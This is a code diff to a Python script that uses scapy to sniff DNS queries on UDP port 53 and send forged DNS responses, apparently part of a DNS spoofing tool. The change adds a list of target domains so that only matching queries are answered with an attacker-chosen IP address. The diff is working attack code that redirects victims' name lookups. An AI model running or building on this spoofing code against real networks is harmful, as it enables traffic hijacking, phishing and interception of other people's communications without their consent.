@@ -35,20 +35,15 @@ def send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, trans
     # Send the packet
     scapy.send(response_packet, iface=Interface , verbose = False)
 
-def dns_request_handler(packet, ip_address, Interface):
-    # Check if packet has DNS layer and is a query
+def dns_request_handler(packet, ip_address, Interface, spoofed_domains=None):
+    # Only spoof if domain matches list
     if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 0:
         client_ip = packet[scapy.IP].src
-        client_port = packet[scapy.UDP].sport
-        domain = packet[scapy.DNSQR].qname.decode("utf-8")  # Decode bytes to string
-        transaction_id = packet[scapy.DNS].id
-        dest_ip = packet[scapy.IP].dst  # IP the client sent the request to
-        
-        # Define the IP address to respond with
-        ip_address = "8.8.8.8"  # Replace with desired IP
-        
-        # Call function to send DNS response
-        send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface)
+        domain = packet[scapy.DNSQR].qname.decode("utf-8")
+        if spoofed_domains is None or domain in spoofed_domains:
+            transaction_id = packet[scapy.DNS].id
+            send_dns_response(client_ip, packet[scapy.UDP].sport, packet[scapy.IP].dst, domain, ip_address, transaction_id, Interface)
+
 
 def start_sniffing(ip_address, Interface):
     scapy.sniff(filter="udp port 53", 
